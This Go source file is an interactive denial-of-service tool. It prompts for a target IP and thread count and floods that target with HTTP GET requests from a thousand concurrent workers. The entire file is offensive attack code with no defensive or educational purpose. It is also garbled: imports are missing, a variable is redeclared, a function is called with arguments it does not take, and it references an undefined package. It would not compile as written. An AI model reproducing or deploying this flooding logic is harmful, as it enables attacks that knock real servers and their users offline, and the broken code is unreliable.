package main

import(
	"fmt"
        "io"
	"os"
        "io/ioutil"
        "net/http"
        "net/url"
        "runtime"
        "sync/atomic"
	"time"
)

const (
	Prefix = "[DDoS] "
	ErrorPrefix = "[ERROR] "
)

type DDoS struct {
        url           string
        stop          *chan bool
        amountWorkers int
        successRequest int64
        amountRequests int64
}

func main() {
	fmt.Print("\x1b]0;" + Prefix + "Please type the ip that you want to DDoS..." + "\x07")
	Log("To quit press: CTRL+C")
	for {
		Log("Please type the ip that you want to DDoS...")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		ip := scanner.Text()
		Log("Please type threads...")
                scanner := bufio.NewScanner(os.Stdin)
                scanner.Scan()
                threads := scanner.Text()

		if len(ip) < 7 || strings.Contains(ip, "legacyhcf") {
			Error("The ip you've provided is invalid!")
		} else {
			running := true
			stop := false
			go func() {
				Log("DDoSing the address " + ip + "...")
				for running == true {
					fmt.Print("\x1b]0;" + Prefix + "DDoSing the address ", ip, "..." + "\x07")
									
					err := DDoS(ip)
					if err != nil {
						Error("Oupsii! Looks like something wrong has happened, Make you sure that the ip you provided is valid.")
						os.Exit(1)
					}
				}
				stop = true
				Log("Successfully stopped the process!")
			}()
			Log("Press ENTER to stop the process!")
			scanner.Scan()
			Log("Stopping the process...")
			running = false
			for !stop {
				fmt.Print("\x1b]0;" + Prefix + "Stopping the process..." + "\x07")
			}
		}
	}
}

func DDoS(){
	workers := 1000
	d, err := ddos.New(ip, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Fprintf(os.Stdout, "DDoS attack server: " + ip)
	return nil
}

func Log(i string) {
	fmt.Println(Prefix + i)
}

func Error(i string) {
	Log(ErrorPrefix + i)
}

func New(URL string, workers int) (*DDoS, error) {
        if workers < 1 {
                return nil, fmt.Errorf("Amount of workers cannot be less 1")
        }
        u, err := url.Parse(URL)
        if err != nil || len(u.Host) == 0 {
                return nil, fmt.Errorf("Undefined host or error = %v", err)
        }
        s := make(chan bool)
        return &DDoS{
                url:           URL,
                stop:          &s,
                amountWorkers: workers,
        }, nil
}

func (d *DDoS) Run() {
        for i := 0; i < d.amountWorkers; i++ {
                go func() {
                        for {
                                select {
                                case <-(*d.stop):
                                        return
                                default:
                                        // sent http GET requests
                                        resp, err := http.Get(d.url)
                                        atomic.AddInt64(&d.amountRequests, 1)
                                        if err == nil {
                                                atomic.AddInt64(&d.successRequest, 1)
                                                _, _ = io.Copy(ioutil.Discard, resp.Body)
                                                _ = resp.Body.Close()
                                        }
                                }
                                runtime.Gosched()
                        }
                }()
        }
}

func (d *DDoS) Stop() {
        for i := 0; i < d.amountWorkers; i++ {
                (*d.stop) <- true
        }
        close(*d.stop)
}

func (d DDoS) Result() (successRequest, amountRequests int64) {
        return d.successRequest, d.amountRequests
}
